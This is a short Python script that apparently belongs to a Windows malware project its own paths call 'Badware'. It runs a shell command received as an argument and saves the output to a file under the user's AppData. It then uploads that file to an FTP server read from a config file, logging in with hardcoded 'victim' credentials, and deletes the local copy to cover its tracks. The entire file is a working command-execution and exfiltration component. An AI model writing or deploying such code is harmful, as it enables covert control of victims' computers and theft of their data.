import sys
import subprocess
import ftplib
import os
username = os.getlogin()
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\ftpserver", "r") as servername:
	server = servername.read()
res = subprocess.Popen(sys.argv[1].split(), shell=True, stdout=subprocess.PIPE).stdout.read().decode("latin1")
if os.path.isfile(fr"C:\users\{username}\AppData\Local\Aryan\Badware\commres.txt"):
    os.remove(fr"C:\users\{username}\AppData\Local\Aryan\Badware\commres.txt")
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\commres.txt", "x") as result:
    result.write(res)
session = ftplib.FTP(server,'victim','victimpass1234')
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\commres.txt", 'rb') as result:
    session.storbinary('STOR commres.txt', result)
session.quit()
os.remove(fr"C:\users\{username}\AppData\Local\Aryan\Badware\commres.txt")